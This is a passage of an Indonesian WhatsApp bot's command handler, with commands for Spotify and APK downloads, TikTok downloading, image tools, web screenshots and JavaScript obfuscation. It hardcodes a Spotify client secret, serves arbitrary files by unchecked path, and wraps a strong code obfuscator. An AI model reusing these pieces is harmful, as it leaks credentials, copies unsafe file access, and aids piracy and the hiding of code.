if (!match) return m.reply("⚠️ *Terjadi kesalahan! Pastikan link valid.*");
let inviteId = match[1];
try {
 let metadata = await conn.newsletterMetadata("invite", inviteId);
 if (!metadata || !metadata.id) return m.reply("⚠️ *Gagal mengambil data channel. Pastikan link benar atau coba lagi nanti.*");
 let caption = `*— 乂 Channel Info —*\n\n` +
 `🆔 *ID:* ${metadata.id}\n` +
 `📌 *Nama:* ${metadata.name}\n` +
 `👥 *Pengikut:* ${metadata.subscribers?.toLocaleString() || "Tidak diketahui"}\n` +
 `📅 *Dibuat sejak:* ${metadata.creation_time ? new Date(metadata.creation_time * 1000).toLocaleString("id-ID") : "Tidak diketahui"}\n` +
 `📄 *Deskripsi:* ${metadata.description || "Tidak ada deskripsi."}`;

 if (metadata.preview) {
 await conn.sendMessage(m.chat, { 
 image: { url: "https://pps.whatsapp.net" + metadata.preview }, 
 caption 
 });
 } else {
 m.reply(caption);
 }
} catch (error) {
 console.error("Error:", error);
 m.reply("Terjadi kesalahan! Bisa jadi link salah..");
}
}
break
case 'spotify2': case 'plays2': case 'playspotify2': {
  if (!q) return m.reply("Silakan masukkan judul lagu.\nContoh: *.plays2 blue*");
  await conn.sendMessage(m.chat, { react: { text: "🍁", key: m.key } });
  const client_id = "fe50d7b5a68a4addbb99186d99062c4a"; // https://developer.spotify.com
  const client_secret = "9dda0cf91d524a6bbb18ac18592dd048";
  const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");

const axios = require('axios');
  const getToken = async () => {
    const res = await axios.post(
      "https://accounts.spotify.com/api/token",
      "grant_type=client_credentials",
      {
        headers: {
          Authorization: "Basic " + basic,
          "Content-Type": "application/x-www-form-urlencoded",
        },
      }
    );
    return res.data.access_token;
  };

  const searchTrack = async (query, token) => {
    const res = await axios.get( `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&limit=1`,
      {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      }
    );
    if (res.data.tracks.items.length === 0) throw new Error("Lagu tidak ditemukan.");
    return res.data.tracks.items[0];
  };

  const getDownloadLink = async (trackUrl) => {
const axios = require('axios');
    const res = await axios.post(
      "https://spotydown.media/api/download-track",
      { url: trackUrl },
      { headers: { "Content-Type": "application/json" } }
    );
    if (!res.data.file_url) throw new Error("Gagal mengambil link download.");
    return res.data.file_url;
  };

  try {
    const token = await getToken();
    const track = await searchTrack(q, token);
    const downloadUrl = await getDownloadLink(track.external_urls.spotify);
    await conn.sendMessage(m.chat, {
      audio: { url: downloadUrl },
      mimetype: "audio/mpeg",
      ptt: false,
      contextInfo: {
        externalAdReply: {
          title: track.name,
          body: `Artis: ${track.artists.map((a) => a.name).join(", ")}`,
          thumbnailUrl: track.album.images[0]?.url,
          mediaType: 1,
          mediaUrl: track.external_urls.spotify,
          sourceUrl: track.external_urls.spotify,
        },
      },
    }, { quoted: m });
    await conn.sendMessage(m.chat, { react: { text: "🌸", key: m.key } });
  } catch (err) {
    console.log(err);
    await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    m.reply("Gagal mengambil lagu. Coba lagi nanti.");
  }
}
break

case 'plays':
case 'playspotify': {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: *plays Duka Last Child*');

  try {
    const res = await fetch(`https://api.nekorinn.my.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`);
    if (!res.ok) return m.reply('Gagal mengambil data dari server.');
    const data = await res.json();
    if (!data.status || !data.result) return m.reply('Lagu tidak ditemukan!');
    const { title, artist, duration, imageUrl, link } = data.result.metadata;
    const downloadUrl = data.result.downloadUrl;
    const thumbnail = await (await fetch(imageUrl)).buffer();
    await conn.sendMessage(m.chat, {
      audio: { url: downloadUrl },
      mimetype: 'audio/mpeg',
      fileName: `${title} - ${artist}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: title,
          body: `${artist} • ${duration}`,
          thumbnail,
          mediaUrl: link,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: link
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan saat memproses permintaanmu.');
  }
}
break

case 'apk': {
  if (!q) return m.reply('Contoh:\n.apk search Mobile Legends\n.apk detail <url>\n.apk download <url>')
  let [cmd, ...args] = q.split(' ')
  let text = argsbiyuoffc.join(' ')

  switch (cmd.toLowerCase()) {
    case 'search':
      if (!text) return m.reply('Contoh: .apk search Mobile Legends')
      try {
        let res = await fetch(`https://www.velyn.biz.id/api/search/apk4freesearch?query=${encodeURIComponent(text)}`)
        let data = await res.json()
        if (!data.status || !data.result || data.result.length === 0) return m.reply('Tidak ditemukan hasil.')
        let teks = `*Hasil Pencarian APK untuk:* ${text}\n\n`
        for (let i = 0; i < data.result.length; i++) {
          let apk = data.result[i]
          teks += `*${i + 1}. ${apk.title || '-'}*\n`
          teks += `Developer: ${apk.developer || '-'}\n`
          teks += `Versi: ${apk.version || '-'}\n`
          teks += `Rating: ${apk.rating || '-'}\n`
          teks += `Link: ${apk.link || '-'}\n\n`
        }
        let thumb = data.result[0].image || null
        conn.sendMessage(m.chat, {
          image: { url: thumb },
          caption: teks,
        }, { quoted: m })
      } catch (e) {
        console.error(e)
        m.reply('Terjadi kesalahan saat mencari APK.')
      }
      break

    case 'detail':
      if (!text) return m.reply('Contoh: .apk detail https://apk4free.net/mobile-legends/')
      try {
        let res = await fetch(`https://www.velyn.biz.id/api/search/apk4freedetail?url=${encodeURIComponent(text)}`)
        let data = await res.json()
        if (!data.status || !data.result) return m.reply('Detail APK tidak ditemukan.')
        const d = data.result
        let caption = `*${d.title || 'Tanpa Judul'}*\n\n`
        caption += `*Versi:* ${d.version || '-'}\n`
        caption += `*Genre:* ${d.genre || '-'}\n`
        caption += `*Developer:* ${d.developer || '-'}\n`
        caption += `*Rating:* ${d.rating || '-'} (${d.votes || '-'} suara)\n`
        caption += `*Requirement:* Android ${d.requirements || '-'}\n`
        caption += `*Total Download:* ${d.downloads || '-'}\n`
        caption += `*Playstore:* ${d.playstore || '-'}\n`
        caption += `*Download Link:* ${d.download || '-'}\n\n`
        caption += `*Deskripsi Singkat:*\n${d.description || '-'}\n\n`
        caption += `*Yang Baru:*\n${d.whatsnew || '-'}`

        await conn.sendMessage(m.chat, {
          image: { url: d.icon || '' },
          caption,
        }, { quoted: m })

        if (Array.isArray(d.images) && d.images.length > 0) {
          for (let img of d.images) {
            await conn.sendMessage(m.chat, {
              image: { url: img },
              caption: 'Screenshot',
            }, { quoted: m })
          }
        }

        if (Array.isArray(d.related) && d.related.length > 0) {
          let teks = `*Rekomendasi APK Terkait:*\n\n`
          for (let rel of d.related) {
            teks += `• *${rel.title || '-'}*\n`
            teks += `Developer: ${rel.developer || '-'}\n`
            teks += `Versi: ${rel.version || '-'}\n`
            teks += `Rating: ${rel.rating || '-'}\n`
            teks += `Link: ${rel.link || '-'}\n\n`
          }
          await m.reply(teks)
        }
      } catch (e) {
        console.error(e)
        m.reply('Gagal mengambil detail APK.')
      }
      break
    case 'download': case 'dowload': 
      if (!text) return m.reply('Contoh: .apk download https://apk4free.net/pubg-mobile/download/')
      try {
        const axios = require('axios')
        const res = await axios.get(`https://www.velyn.biz.id/api/search/apk4freedownload?url=${text}`)
        const data = res.data
        if (!data.status) return m.reply('Gagal mengambil data APK!')
        const apk = data.result

        const caption = `*APK DITEMUKAN!*\n\n` +
                        `*Title:* ${apk.title}\n` +
                        `*Package:* ${apk.package}\n` +
                        `*Version:* ${apk.version}\n` +
                        `*Size:* ${apk.size || 'Tidak tersedia'}\n` +
                        `*Requirements:* ${apk.requirements}\n\n` +
                        `*Link Download:*\n${apk.url}`
        await conn.sendMessage(m.chat, {
          text: caption,
          contextInfo: {
            externalAdReply: {
              title: apk.title,
              body: "Download APK Gratis",
              thumbnailUrl: 'https://img12.pixhost.to/images/1545/585982689_biyuofficial.jpg', 
              mediaType: 1,
              mediaUrl: apk.url,
              sourceUrl: apk.url
            }
          }
        }, { quoted: m })
        await conn.sendMessage(m.chat, {
          document: { url: apk.url },
          mimetype: 'application/vnd.android.package-archive',
          fileName: `${apk.title.replace(/\s+/g, '_')}.apk`
        }, { quoted: m })
      } catch (e) {
        console.log(e)
        m.reply('Terjadi kesalahan, coba lagi nanti.')
      }
      break

    default:
      m.reply('Subperintah tidak dikenali!\nGunakan:\n.apk search <nama>\n.apk detail <url>\n.apk download <url>')
  }
}
break
case 'balogo':
case 'balg': {
  if (!argsbiyuoffc[1]) return m.reply(`Contoh penggunaan:\n${prefix + command} Udin Offc\n\nGunakan 2 kata: text kiri dan text kanan.`)

  let [textL, textR] = args;
  let apiUrl = `https://api.nekorinn.my.id/maker/ba-logo?textL=${encodeURIComponent(textL)}&textR=${encodeURIComponent(textR)}`;

  try {
const axios = require('axios');
    let res = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    let buffer = Buffer.from(res.data, 'binary');

    await conn.sendMessage(m.chat, {
      image: buffer,
      caption: `Berhasil membuat logo dengan teks:\nKiri: ${textL}\nKanan: ${textR}`
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Gagal mengambil data dari API. Coba lagi nanti.');
  }
}
break
case "getfile": {
 if (!isCreator) return m.reply('[ FITUR KHUSUS OWNER ]')
 if (!q) return m.reply("Masukkan nama file!\nContoh: getfile biyu.js")
 const filePath = path.join(__dirname, q)
 if (!fs.existsSync(filePath)) return m.reply("File tidak ditemukan!")
 const stat = fs.statSync(filePath)
 if (stat.isDirectory()) return m.reply("Itu folder, bukan file!")
 const mime = require("mime-types")
 const mimetype = mime.lookup(filePath) || 'application/octet-stream'
 const fileName = path.basename(filePath)
 await conn.sendMessage(m.sender, {
 document: fs.readFileSync(filePath),
 fileName,
 mimetype
 }, { quoted: m })
 if (m.chat !== m.sender) return m.reply("File berhasil dikirim ke private chat")
}
break
case "sggl":
case "searchgoogle": 
case "searchggl": {
    if (!q) return m.reply("Masukkan kata kunci pencarian!");    
    let url = `https://api.hiuraa.my.id/search/google?q=${encodeURIComponent(q)}`;
    try {
        let res = await fetch(url);
        let json = await res.json();
        if (!json.status || !json.result.length) return m.reply("Tidak ada hasil ditemukan.");
        let hasil = json.result.map((item, i) => 
            `*${i + 1}. ${item.title}*\n${item.desc}\n🔗 ${item.link}`
        ).join("\n\n");

        m.reply(`🔍 *Hasil Pencarian Google:*\n\n${hasil}`);
    } catch (e) {
        console.error(e);
        m.reply("Terjadi kesalahan saat mengambil data.");
    }
}
    break
    
case "sh3": case "searchsticker3": case "stickersearch3": {
    if (!text) return m.reply('Sticker Apa Yg Kamu Cari?')
    m.reply('_Sedang Mencari Sticker Line..._');
    
    try {
        let apiUrl = `https://fastrestapis.fasturl.cloud/sticker/line?name=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        const response = await res.json();
        
        if (!response.result || response.result.length === 0) {
            return m.reply('Tidak ditemukan sticker yang sesuai');
        }

        let filteredPacks = response.result.filter(pack => {
            const searchTerms = text.toLowerCase().split(' ');
            const packTitle = pack.title.toLowerCase();
            return searchTerms.every(term => packTitle.includes(term));
        });

        if (filteredPacks.length === 0) {
            return m.reply(`Tidak ditemukan sticker ${text} yang sesuai`);
        }

        filteredPacks = filteredPacks.sort(() => Math.random() - 0.5);
        filteredPacks = filteredPacks.slice(0, 10);

        const packNames = [
            "Sticker Keren ",
            "Sticker Lucu ",
            "Created ",
            "Special Sticker ",
            "Random Sticker ",
            "Koleksi Sticker ",
            "Sticker Pack ",
            "Daily Sticker ",
            "Magic Sticker ",
            "Cute Sticker "
        ];
        for (let stickerPack of filteredPacks) {
            let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
                          `- *Title:* ${stickerPack.title}\n` +
                          `- *ID:* ${stickerPack.id}\n` +
                          `- *Author:* ${stickerPack.authorName}\n` +
                          `- *URL:* ${stickerPack.url}\n` +
                          `_Mengirim Sticker Harap Tunggu..._`;
            
            
            const infoMsg = await conn.sendMessage(m.chat, { text: packInfo }, { quoted: m });

      
            if (stickerPack.stickerAnimated) {
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                
                await conn.sendAsSticker(m.chat, stickerPack.stickerAnimated, m, {
                    packname: randomPackname,
                    author: `By ${global.namaOwner}`, 
                    quoted: infoMsg 
                });

                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }

       
        m.reply(`Berhasil mengirim ${filteredPacks.length} sticker dari pencarian "${text}"`);

    } catch (e) {
        console.error('Error in stickersearch:', e);
        m.reply('Terjadi kesalahan saat mencari sticker');
    }
}
break

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = argsbiyuoffc[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "kisahnabi": {
if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return m.reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*—————— \`[ K I S A H ]\` ——————*

${kisah.description}`

m.reply(`${hasil}`)

}
break
case 'img-large': {
  let generateId = () => `${crypto.randomBytes(8).toString('hex')}_aiimglarger`
const axios = require('axios')
const FormData = require('form-data')
const crypto = require('crypto')

  async function upscaleImage(buffer, filename, scale, type) {
    try {
      let id = generateId()
      let form = new FormData()
      form.append('type', type)
      form.append('username', id)
      form.append('scaleRadio', scale.toString())
      form.append('file', buffer, { filename, contentType: 'image/jpeg' })
      let upload = await axios.post('https://photoai.imglarger.com/api/PhoAi/Upload', form, {
        headers: {
          ...form.getHeaders(),
          'User-Agent': 'Dart/3.5 (dart:io)',
          'Accept-Encoding': 'gzip'
        }
      })
      let { code } = upload.data.data
      let params = { code, type, username: id, scaleRadio: scale.toString() }
      for (let i = 0; i < 1000; i++) {
        let check = await axios.post('https://photoai.imglarger.com/api/PhoAi/CheckStatus', params, {
          headers: {
            'User-Agent': 'Dart/3.5 (dart:io)',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip'
          }
        })
        let data = check.data.data
        if (data.status === 'success') return data.downloadUrls[0]
        await new Promise(resolve => setTimeout(resolve, 500))
      }
      throw new Error('Proses upscale melebihi batas polling')
    } catch (error) {
      console.error(error)
      return error
    }
  }
  let scale = parseInt(argsbiyuoffc[0]) || 4
  if (![2, 4].includes(scale)) return m.reply('Skala hanya bisa 2 atau 4')
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime.startsWith('image/')) return m.reply('Silakan kirim gambar dengan caption *img-large 2/4* atau reply gambar')
  let img = await q.download()
  let res = await upscaleImage(img, 'input.jpg', scale, 0)
  if (res instanceof Error) return m.reply(res.message)
  if (!res) return m.reply('Gagal melakukan upscale')
  await conn.sendMessage(m.chat, { 
    image: { url: res }
  }, { quoted: m })
}
break
case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await conn.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'readerweb':
case 'webreader':
  if (argsbiyuoffc.length === 0) {
    m.reply('Harap berikan URL yang valid!');
    return;
  }
  const url = argsbiyuoffc.join(' '); 
  const apiUrl4 = `https://api.mistra.top/api/ai/agent/web-reader?url=${encodeURIComponent(url)}&language=id`;
  fetch(apiUrl4)
    .then(response => response.json())
    .then(data => {
      if (data.status === 200) {
        const result = data.result;
        const metadata = data.data.metadata;
        const images = data.data.images.map(img => img.src).join('\n');
        let message = `
### Analisis Data Website: ${metadata.title}

#### Deskripsi:
${metadata.description}

#### Struktur Website:
${result}

#### Gambar:
${images ? images : 'Tidak ada gambar yang ditemukan'}

#### Link Website:
${data.url}
        `;
        m.reply(message);
      } else {
        m.reply('Terjadi kesalahan saat mengambil data dari URL.');
      }
    })
    .catch(err => {
      m.reply('Terjadi kesalahan dalam proses pengambilan data.');
    });
  break

case 'ssweb2': {
  if (!q.includes('|')) return m.reply('Example:\nssweb2 url|thema|device\n\nContoh:\nssweb2 https://detik.com|dark|mobile\n\nList Thema: dark, light\nList Device: mobile, desktop, tablet')
  let [link, theme, device] = q.split('|')
  if (!/^https?:\/\//.test(link)) return m.reply('Link harus diawali http:// atau https://')
  if (!['dark', 'light'].includes(theme)) return m.reply('Theme hanya bisa: dark, light')
  if (!['mobile', 'desktop', 'tablet'].includes(device)) return m.reply('Device hanya bisa: mobile, desktop, tablet')
  let apiUrl = `https://api.siputzx.my.id/api/tools/ssweb?url=${encodeURIComponent(link)}&theme=${theme}&device=${device}`
  
  try {
    await conn.sendMessage(m.chat, {
      image: { url: apiUrl },
      caption: `✅ Screenshot dari:\n${link}\n\nTheme: ${theme}\nDevice: ${device}`
    }, { quoted: m })
  } catch (e) {
    m.reply('Gagal mengambil screenshot. Pastikan URL valid dan server API aktif.')
  }
}
  break
    
case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data2 = await screenshotV2(text)
await conn.sendMessage(m.chat, { image: data2, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'createquote2': case 'quoteimg2': {
 if (!text) return m.reply(`*Cara pakai fitur Quote:*\n\nKetik:\n*createquote2 teks | username | tanda tangan | ppUrl*\n\nContoh tanpa ppUrl (otomatis pakai foto profil kamu):\ncreatequote2 Aku semangat! | Biyu | Official\n\nContoh dengan gambar custom:\ncreatequote2 Semangat terus! | Biyu | Admin | https:/xxxxxx.jpg`)
 let [isi, usern = '', sign = '', ppUrl = ''] = text.split("|").map(v => v.trim())
 if (!isi) return m.reply('Teks quote tidak boleh kosong.')
 if (!ppUrl) {
 ppUrl = await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg')
 }
 let url = `https://fastrestapis.fasturl.cloud/maker/quote?text=${encodeURIComponent(isi)}&username=${encodeURIComponent(usern)}&ppUrl=${encodeURIComponent(ppUrl)}&signature=${encodeURIComponent(sign)}`
 
 try {
 conn.sendMessage(m.chat, { image: { url }, caption: "Berhasil dibuat!" }, { quoted: m })
 } catch (e) {
 console.log('Gagal kirim quote:', e)
 m.reply('Gagal membuat quote, coba lagi nanti.')
 }
}
break

case 'createquote': 
case 'quoteimg': {
  if (!text) return m.reply('Kirim teks quotesnya!\nContoh: .quoteimg Jangan pernah menyerah, bro.');
  const { createCanvas, loadImage } = require('canvas');
  function wrapText(ctx, text, maxWidth) {
    const words = text.split(' ');
    let lines = [];
    let currentLine = words[0];
    for (let i = 1; i < words.length; i++) {
      const word = words[i];
      const width = ctx.measureText(currentLine + ' ' + word).width;
      if (width < maxWidth) {
        currentLine += ' ' + word;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    lines.push(currentLine);
    return lines;
  }
  async function generateQuoteImage(ppUrl, username, quoteText) {
    const width = 1000;
    const height = 500;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000000';
    ctx.fillRect(0, 0, width, height);
    const avatar = await loadImage(ppUrl);
    ctx.save();
    ctx.beginPath();
    ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
    ctx.closePath();
    ctx.clip();
    ctx.drawImage(avatar, 60, 130, 240, 240);
    ctx.restore();
    ctx.fillStyle = '#ffffff';
    ctx.font = '28px sans-serif';
    let lines = wrapText(ctx, quoteText, 600);
    lines.forEach((line, i) => {
      ctx.fillText(line, 350, 180 + i * 35);
    });
    ctx.fillStyle = '#aaaaaa';
    ctx.font = '22px italic';
    ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
    return canvas.toBuffer();
  }
  let pushname = m.pushName || m.sender.split('@')[0];
  let ppUrl = await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg');
  let buffer = await generateQuoteImage(ppUrl, pushname, text);

  await conn.sendMessage(m.chat, {
    image: buffer,
    caption: `📝 Quote dari *${pushname}*\n\n> kennzy`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });
}
break

case 'animefind': case 'apaitu': {
  try {
    const quoted = m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    if (!/image/.test(mime)) return m.reply("Harap reply ke gambar yang mau dicari")
    const media = await quoted.download()
    const detect = async (buffer) => {
      const axios = require('axios')
      const BodyForm = require('form-data')
      const { fromBuffer } = require('file-type')
      return new Promise(async (resolve, reject) => {
        try {
          const BASE_URL = "https://smilingwolf-wd-tagger.hf.space/gradio_api"
          const session_hash = Math.random().toString(36).substring(2)
          const file_name = Math.random().toString(36).substring(2)
          const hr = {
            origin: "https://smilingwolf-wd-tagger.hf.space",
            referer: "https://smilingwolf-wd-tagger.hf.space/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "content-type": "application/json",
          }
          const { ext, mime } = (await fromBuffer(buffer)) || {}
          const form = new BodyForm()
          form.append("files", buffer, {
            filename: file_name + "." + ext,
            contentType: mime
          })
          const files = await axios.post(BASE_URL + "/upload?" + new URLSearchParams({
            upload_id: session_hash
          }), form, {
            headers: { ...hr, ...form.getHeaders() }
          }).then(i => i.data)
          const file_res = {
            path: files[0],
            mime_type: mime,
            orig_name: file_name + "." + ext,
            meta: { _type: "gradio.FileData" },
            size: buffer.length,
            url: BASE_URL + "/file=" + files[0],
          }
          await axios.post(BASE_URL + "/queue/join?", {
            data: [
              file_res,
              "SmilingWolf/wd-swinv2-tagger-v3",
              0.35,
              true,
              0.85,
              true
            ],
            event_data: null,
            fn_index: 2,
            session_hash,
            trigger_id: 18,
          })
          const stream = await axios.get(BASE_URL + "/queue/data?" + new URLSearchParams({
            session_hash
          }), {
            headers: { ...hr, "content-type": "text/event-stream" },
            responseType: "stream"
          })
          let result = ''
          stream.data.on('data', (chunk) => {
            result += chunk.toString()
            const lines = result.split('\n')
            result = lines.pop()
            for (const line of lines) {
              if (line.startsWith('data: ')) {
                try {
                  const data = JSON.parse(line.substring(6))
                  if (data.msg !== "process_completed") continue
                  if (!data.success) return resolve({ status: false, data })
                  const dt = data.output.data
                  const is_char = typeof dt[2]?.label === 'string'
                  const res = {
                    prompt: dt[0],
                    rating: dt[1].confidences,
                    character: {
                      name: dt[2]?.label,
                      list: dt[2]?.confidences
                    },
                    tags: {
                      name: dt[3].label,
                      list: dt[3].confidences
                    }
                  }
                  return resolve({
                    status: true,
                    data: res,
                    is_char
                  })
                } catch (err) {
                  console.error('Error parsing JSON:', err)
                  resolve({ status: false, msg: err.message })
                }
              }
            }
          })
        } catch (e) {
          reject(e)
        }
      })
    }
    const res = await detect(media)
    const fixed = num => (num * 100).toFixed(2)
    if (!res.is_char) return m.reply("Tidak terdeteksi karakter di gambar tersebut")
    const teks = `
*⎣⧉⎤ Karakter yang terdeteksi adalah*
> *Nama:* ${res.data.character.name}
> *Persentase:* ${fixed(res.data.character.list[0].confidence || 0)}%
${res.data.character.list.length >= 2 ? `\n*⎣⧉⎤ Karakter lain yang terdeteksi*\n${res.data.character.list.map((it) => `> *Nama:* ${it.label}\n> *Persentase:* ${fixed(it.confidence || 0)}%`).join('\n\n')}\n` : ''}
*⎣⧉⎤ Prompt*
${res.data.prompt}

*⎣⧉⎤ Rating*
${res.data.rating.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}

*⎣⧉⎤ Tag*
${res.data.tags.list.map(it => `> *${it.label}:* ${fixed(it.confidence || 0)}%`).join('\n')}
`.trim()
    m.reply(teks)
  } catch (e) {
    console.error(e)
    m.reply(`Terjadi kesalahan saat mendeteksi karakter!\n\n${e.message}`)
  }
}
break
case 'murottal': {
 const axios = require('axios');
 const Murottal = {
 async list() {
 return (await axios.get('https://www.assabile.com/ajax/loadplayer-12-9')).data.Recitation;
 },
 async search(q) {
 let list = await this.list();
 return (typeof q === 'number')
 ? [list[q - 1]]
 : list.filter(_ =>
 _.span_name.toLowerCase().replace(/\W/g, '').includes(q.toLowerCase().replace(/\W/g, ''))
 );
 },
 async audio(d) {
 const mp3 = await axios.get('https://www.assabile.com/ajax/getrcita-link-' + d.href.slice(1), {
 headers: {
 'referer': 'https://www.assabile.com/abdul-rahman-al-sudais-12/abdul-rahman-al-sudais.htm',
 'x-requested-with': 'XMLHttpRequest',
 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36'
 }
 });
 return mp3.data;
 }
 };

 try {
 if (!q) {
 const list = await Murottal.list();
 let teks = `Cara Menggunakan Fitur ini: ${prefix}murottal 2\n\n*Daftar Surah Al-Qur\'an:*\n\n`;
 list.forEach((surah, i) => {
 teks += `${i + 1}. ${surah.span_name}\n`;
 });
 return m.reply(teks);
 }
 let query = isNaN(q) ? q : parseInt(q);
 const result = await Murottal.search(query);
 if (!result.length) return m.reply('Surah tidak ditemukan!');

 const mp3 = await Murottal.audio(result[0]);
 await conn.sendMessage(m.chat, {
 document: { url: mp3 },
 fileName: `Surah-${result[0].span_name}.mp3`,
 mimetype: 'audio/mpeg',
 caption: `Surah ${result[0].span_name}`
 }, { quoted: m });
 } catch (err) {
 console.error(err);
 m.reply('Terjadi kesalahan saat mengambil murottal.');
 }
}
break
case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript") return m.reply(example("dengan reply file .js"))
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard":
case "encrypthard": {
    if (!isCreator) return Reply(mess.owner)
    if (!m.quoted) return m.reply("Reply file .js")
    if (!/javascript|text/.test(mime)) return reply("Reply file .js")

    let media = await m.quoted.download()
    if (!media) return m.reply("Gagal download file.")

